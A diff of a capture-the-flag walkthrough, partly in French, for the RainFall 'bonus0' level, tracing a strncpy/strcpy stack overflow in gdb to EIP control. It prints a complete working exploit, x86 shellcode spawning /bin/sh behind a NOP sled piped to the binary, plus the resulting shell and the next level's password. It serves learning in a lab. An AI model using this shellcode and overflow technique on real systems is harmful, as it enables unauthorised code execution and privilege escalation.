@@ -1,65 +1,43 @@
-(gdb) disas main
-Dump of assembler code for function main:
-   0x080485a4 <+0>:	push   %ebp
-   0x080485a5 <+1>:	mov    %esp,%ebp
-   0x080485a7 <+3>:	and    $0xfffffff0,%esp
-   0x080485aa <+6>:	sub    $0x40,%esp
-   0x080485ad <+9>:	lea    0x16(%esp),%eax
-   0x080485b1 <+13>:	mov    %eax,(%esp)
-   0x080485b4 <+16>:	call   0x804851e <pp>
-   0x080485b9 <+21>:	lea    0x16(%esp),%eax
-   0x080485bd <+25>:	mov    %eax,(%esp)
-   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
-   0x080485c5 <+33>:	mov    $0x0,%eax
-   0x080485ca <+38>:	leave  
-   0x080485cb <+39>:	ret    
-End of assembler dump.
-(gdb) disas pp
-Dump of assembler code for function pp:
-   0x0804851e <+0>:	push   %ebp
-   0x0804851f <+1>:	mov    %esp,%ebp
-   0x08048521 <+3>:	push   %edi
-   0x08048522 <+4>:	push   %ebx
-   0x08048523 <+5>:	sub    $0x50,%esp
-   0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp)
-   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
-   0x08048531 <+19>:	mov    %eax,(%esp)
-   0x08048534 <+22>:	call   0x80484b4 <p>
-   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
-   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
-   0x08048544 <+38>:	mov    %eax,(%esp)
-   0x08048547 <+41>:	call   0x80484b4 <p>
-   0x0804854c <+46>:	lea    -0x30(%ebp),%eax
-   0x0804854f <+49>:	mov    %eax,0x4(%esp)
-   0x08048553 <+53>:	mov    0x8(%ebp),%eax
-   0x08048556 <+56>:	mov    %eax,(%esp)
-   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
-   0x0804855e <+64>:	mov    $0x80486a4,%ebx
-   0x08048563 <+69>:	mov    0x8(%ebp),%eax
-   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
-   0x0804856d <+79>:	mov    %eax,%edx
-   0x0804856f <+81>:	mov    $0x0,%eax
-   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx
-   0x08048577 <+89>:	mov    %edx,%edi
-   0x08048579 <+91>:	repnz scas %es:(%edi),%al
-   0x0804857b <+93>:	mov    %ecx,%eax
-   0x0804857d <+95>:	not    %eax
-   0x0804857f <+97>:	sub    $0x1,%eax
-   0x08048582 <+100>:	add    0x8(%ebp),%eax
-   0x08048585 <+103>:	movzwl (%ebx),%edx
-   0x08048588 <+106>:	mov    %dx,(%eax)
-   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax
-   0x0804858e <+112>:	mov    %eax,0x4(%esp)
-   0x08048592 <+116>:	mov    0x8(%ebp),%eax
-   0x08048595 <+119>:	mov    %eax,(%esp)
-   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
-   0x0804859d <+127>:	add    $0x50,%esp
-   0x080485a0 <+130>:	pop    %ebx
-   0x080485a1 <+131>:	pop    %edi
-   0x080485a2 <+132>:	pop    %ebp
-   0x080485a3 <+133>:	ret    
-End of assembler dump.
-(gdb) disas p
+Le binaire prend deux chaines de caracteres, puis les affiches.
+
+bonus0@RainFall:~$ ./bonus0
+ -
+salut
+ -
+ca va?
+salut ca va?
+
+
+Dans l'assembleur on voit qu'il lit avec read:
+
+(gdb) disass p
+Dump of assembler code for function p:
+		...
+   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
+   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
+   0x080484da <+38>:	movl   $0x0,(%esp)
+   0x080484e1 <+45>:	call   0x8048380 <read@plt>
+   		...
+
+Puis copie les 20 premier avec strncpy:
+
+0x08048505 <+81>:	movl   $0x14,0x8(%esp)
+   0x0804850d <+89>:	mov    %eax,0x4(%esp)
+   0x08048511 <+93>:	mov    0x8(%ebp),%eax
+   0x08048514 <+96>:	mov    %eax,(%esp)
+   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
+
+
+On test avec des "A", et un breackpoint a la fin de la fonction p:
+
+(gdb) b * p + 104
+Breakpoint 1 at 0x804851c
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+(gdb) disass
 Dump of assembler code for function p:
    0x080484b4 <+0>:	push   %ebp
    0x080484b5 <+1>:	mov    %esp,%ebp
@@ -83,126 +61,197 @@ Dump of assembler code for function p:
    0x08048511 <+93>:	mov    0x8(%ebp),%eax
    0x08048514 <+96>:	mov    %eax,(%esp)
    0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
-   0x0804851c <+104>:	leave  
-   0x0804851d <+105>:	ret    
+=> 0x0804851c <+104>:	leave
+   0x0804851d <+105>:	ret
 End of assembler dump.
+(gdb) i r
+eax            0xbffff678	-1073744264
+ecx            0xb7eb9aa0	-1209296224
+edx            0x41414141	1094795585
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbfffe630	0xbfffe630
+ebp            0xbffff648	0xbffff648
+esi            0x0	0
+edi            0x0	0
+eip            0x804851c	0x804851c <p+104>
+eflags         0x200287	[ CF PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/100x 0xbffff678
+0xbffff678:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff688:	0x41414141	0xb7e5ec73	0x0804829c	0x00000000
+0xbffff698:	0x00ca0000	0x00000001	0xb7fd0ff4	0x00000000
+0xbffff6a8:	0xbffff6f8	0x080485b9	0xbffff6c6	0x080498d8
+0xbffff6b8:	0x00000001	0x0804835d	0xb7fd13e4	0x0000000d
+0xbffff6c8:	0x080498d8	0x080485f1	0xffffffff	0xb7e5edc6
+				...
+
+Avec l'adress de retour de strncpy on affiche s1.
+
+Et on affiche le buffer de read:
+
+
+(gdb) x/100x $ebp - 0x1008
+0xbfffe640:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe650:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6c0:	0x00004141	0x00000000	0x00000000	0x00000000
+0xbfffe6d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe700:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe710:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe720:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe730:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe740:	0x00000000	0x00000000	0x00000000	0x00000000
 
 
 
+On test avec s2:
 
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+
+
+(gdb) c
+Continuing.
  -
-1234567890987654321
+BBBBBBBBBBBBBBBBBBBBBBBBB
 
+Breakpoint 1, 0x0804851c in p ()
+(gdb) x/100x $ebp - 0x1008
+0xbfffe640:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbfffe650:	0x42424242	0x42424242	0x41410042	0x41414141
+0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6c0:	0x00004141	0x00000000	0x00000000	0x00000000
+0xbfffe6d0:	0x00000000	0x00000000	0x00000000	0x00000000
+			...
+(gdb) i r
+eax            0xbffff68c	-1073744244
+			...
 
+(gdb) x/100x 0xbffff68c
+0xbffff68c:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff69c:	0x42424242	0xb7fd0ff4	0x00000000	0xbffff6f8
+0xbffff6ac:	0x080485b9	0xbffff6c6	0x080498d8	0x00000001
 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- -
-PPPPPPPPPPPPPPPPPPPPP
+On affiche s2 - 10 pour voir se qu'il y a derriere:
+(gdb) x/100x 0xbffff68c - 10
+0xbffff682:	0x41414141	0x41414141	0x42424141	0x42424242
+0xbffff692:	0x42424242	0x42424242	0x42424242	0x0ff44242
+0xbffff6a2:	0x0000b7fd	0xf6f80000	0x85b9bfff	0xf6c60804
+0xbffff6b2:	0x98d8bfff	0x00010804	0x835d0000	0x13e40804
 
+On se rend compte que strncpy ne copie pas de \0 si il y en a pas.
+Et que les deux chaines sont ducoup colle.
 
-p reads 4096 bytes from STDIN and strncpy returns the first 20 bytes.
-then pp calls strcpy on the return of p strncpy and it's non null terminated.
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
 
-This means that there is the possibility of exploiting strcpy with a buffer 
-overflow.
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
 
-strcpy will copy s1 into s2 in memory and overwrite the EIP return address.
-This will lead to a segmentation fault.
+En continuent on se rend compte que ducoup on a le controle d'eip.
 
+bonus0@RainFall:~$ readelf -a bonus0 | grep "STACK"
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 
-The shellcode we found is 23bytes long :
+On peux voir que la stack est executable.
 
-shellcode = "x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+Donc on vas mettre un shellcode dans le buffer du read et redirger eip vers notre shellcode.
 
-(gdb) disas p
-Dump of assembler code for function p:
-   ...
-   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
+On envoir des nop + notre shellcode a la premiere lecture
 
-gdb) b *p + 28
-Breakpoint 1 at 0x80484d0
 (gdb) r
-Starting program: /home/user/bonus0/bonus0
  -
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
 
-Breakpoint 1, 0x080484d0 in p ()
-(gdb) x $ebp-0x1008
-0xbfffe670:	0x00000000
+Breakpoint 1, 0x0804851c in p ()
+(gdb) x/100x $ebp - 0x1008
+0xbfffe620:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe630:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
+0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
+0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000
+0xbfffe6b0:	0x00000000	0x00000000	0x00000000	0x00000000
 
-We know that the buffer start at the address 0xbfffe580
-We can skip to our shellcode by overwrite eip with NOP slide.
-We can go anywhere in this area but still in the NOP area.
-We can't go under 58 NOP slide or we have a segmentation fault.
+Et a la deuxieme lecture on remplie le buffer de s2 + une adresse dans les nop pour rediriger sur le shellcode.
 
-First arg :
-(python -c 'print ("\x90" * 300 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")' 
-Our NOP + shellcode
+(gdb) c
+ -
+BBBBBBBBBBBBBBAAAA
 
+Breakpoint 1, 0x0804851c in p ()
+(gdb) x/100x $ebp - 0x1008
+0xbfffe620:	0x42424242	0x42424242	0x42424242	0x41414242
+0xbfffe630:	0x4e004141	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
+0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
+0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000
+(gdb) c
+Continuing.
+NNNNNNNNNNNNNNNNNNNNBBBBBBBBBBBBBBAAAA BBBBBBBBBBBBBBAAAA
 
-Second arg :
-python -c 'print ("B" * 14 + "\x80\xe7\xff\xbf" + "B")') | ./bonus0
+Program received signal SIGSEGV, Segmentation fault.
+0x00414141 in ?? ()
 
-With the B we reach EIP, then we overwrite it with our malicious buffer address
-and then on last byte to fill the buffer
+On se rend compte qu'il y a un probleme sur notre eip.
 
-bonus0@RainFall:~$ (python -c 'print ("\x90" * 300 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")' ; python -c 'print ("B" * 14 + "\x80\xe7\xff\xbf" + "B")') | ./bonus0
+Qui est lie au comportement de strncpy on peux lire dans le man si la taille de la source est plus petite
+que la taille de len (20).
+Alors strncpy remplis destination de "\0" jusque len.
+Se qui explique le 0x00414141 ou 00 est un \0.
+Puisqu'on envoir 18 + \n = 19. Il manque donc 1 caractere qui est remplie par strncpy avec un \0.
+
+On ajoute donc un B pour remplire correctement le buffer avec strncpy sans ajouter de \0.
+
+(gdb) c
+BBBBBBBBBBBBBBAAAAB
+
+Breakpoint 1, 0x0804851c in p ()
+(gdb) x/100x $ebp - 0x1008
+0xbfffe620:	0x42424242	0x42424242	0x42424242	0x41414242
+0xbfffe630:	0x00424141	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
+0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
+0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
+0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000
+
+(gdb) c
+NNNNNNNNNNNNNNNNNNNNBBBBBBBBBBBBBBAAAAB BBBBBBBBBBBBBBAAAAB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+Voila reste a remplasser par des vrais valeur: 
+
+bonus0@RainFall:~$ (python -c 'print ("\x90" * 300 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")' ; python -c 'print ("B" * 14 + "\x80\xe7\xff\xbf" + "B")' ; cat) | ./bonus0
  -
  -
 ��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
-$ id
-uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
 $ cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
-$
-
-
-
-We need that last B in the second arg, otherwise we get a segfault.
-It seems in memory there is a bad alignement :
-
-Without the extra char :
-
-(gdb) x/100x 0xbfffe690 - 100
-0xbfffe62c:	0x00000000	0x00000000	0xb7fd0ff4	0x00000000
-0xbfffe63c:	0xb7e2b900	0xbffff678	0xb7ff26b0	0xbffff678
-0xbfffe64c:	0x00001000	0xbfffe670	0xb7f0a213	0x00000000
-0xbfffe65c:	0x080484fc	0xbffff6bc	0xbfffe670	0x00000014
-0xbfffe66c:	0x00000000	0x42424242	0x42424242	0x42424242
-0xbfffe67c:	0x41414242	0x41004141	0x41414141	0x41414141		// diff here
-0xbfffe68c:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbfffe69c:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbfffe6ac:	0x41414141	0x41414141	0x41414141	0x00000041
-0xbfffe6bc:	0x00000000	0x00000000	0x00000000	0x00000000
-
-With the extra char :
-
-gdb) x/100x 0xbfffe690 - 100
-0xbfffe62c:	0x00000000	0x00000000	0xb7fd0ff4	0x00000000
-0xbfffe63c:	0xb7e2b900	0xbffff678	0xb7ff26b0	0xbffff678
-0xbfffe64c:	0x00001000	0xbfffe670	0xb7f0a213	0x00000000
-0xbfffe65c:	0x080484fc	0xbffff6bc	0xbfffe670	0x00000014
-0xbfffe66c:	0x00000000	0x42424242	0x42424242	0x42424242
-0xbfffe67c:	0x41414242	0x00424141	0x41414141	0x41414141		// diff here
-0xbfffe68c:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbfffe69c:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbfffe6ac:	0x41414141	0x00616141	0x00000000	0x00000000
-0xbfffe6bc:	0x00000000	0x00000000	0x00000000	0x00000000
-
-
-*******************************************
-
-
-
-S1 est remplie par strncpy qui copie 20 caracteres depuis la lecture du read de 4096.
-strncpy ne copie pas de \0 dans S1 qui est donc vulnerable a un overflow.
-Pareil pour S2.
-
-Exemple : S1 fait 40 de taille donc si le buffer de read contient plus de 20 caracteres sans \0
-ils seront alors copies et s1 sera remplie.
-
-On peut donc mettre plus de 42 caracteres et ainsi avoir le controle sur EIP.
-Pour exploiter ce binaire, on envoie dans S1 des NOP suivi d'un shellcode
-Ensuite il suffit de remplir le buffer de S2
-
-
